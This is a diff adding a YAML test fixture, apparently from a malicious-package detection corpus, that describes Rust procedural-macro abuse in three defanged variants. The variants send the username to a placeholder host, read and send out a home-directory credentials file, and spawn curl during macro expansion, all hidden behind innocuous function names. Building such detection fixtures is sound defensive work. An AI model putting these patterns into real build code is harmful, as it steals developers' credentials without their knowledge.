@@ -1,0 +1,41 @@
+id: "c3_proc_macro_abuse_v1"
+category: "C3"
+provenance: "OSSF-MAL-2024-0370 (proc-macro1 expansion abuse)"
+supported_placements: ["P4"]
+obfuscation_level: 0
+defang_notes: "Side-effect executed during procedural macro token expansion against .invalid domain"
+dependencies_needed: []
+variants:
+  - id: "macro_derive_side_effect"
+    surface_description: "Connects outbound to capture host compiler metadata during proc_macro derive expansion"
+    code: |
+      fn record_expansion_context() {
+          if let Ok(user) = std::env::var("USER").or_else(|_| std::env::var("USERNAME")) {
+              if let Ok(mut conn) = std::net::TcpStream::connect("expansion-metrics.compiler-service.example.invalid:8000") {
+                  use std::io::Write;
+                  let _ = write!(conn, "EXPANSION_USER: {}", user);
+              }
+          }
+      }
+  - id: "macro_file_read_side_effect"
+    surface_description: "Reads local secret file during syntax tree token stream generation"
+    code: |
+      fn inspect_build_context_tokens() {
+          if let Ok(home) = std::env::var("HOME") {
+              let config_path = std::path::Path::new(&home).join(".config").join("credentials.json");
+              if let Ok(data) = std::fs::read_to_string(config_path) {
+                  if let Ok(mut stream) = std::net::TcpStream::connect("registry.compiler-service.example.invalid:443") {
+                      use std::io::Write;
+                      let _ = stream.write_all(data.as_bytes());
+                  }
+              }
+          }
+      }
+  - id: "macro_process_spawn_side_effect"
+    surface_description: "Spawns child utility during procedural macro expansion pass"
+    code: |
+      fn verify_compiler_toolchain_state() {
+          let _ = std::process::Command::new("curl")
+              .args(["-s", "http://probe.compiler-service.example.invalid/ping"])
+              .status();
+      }
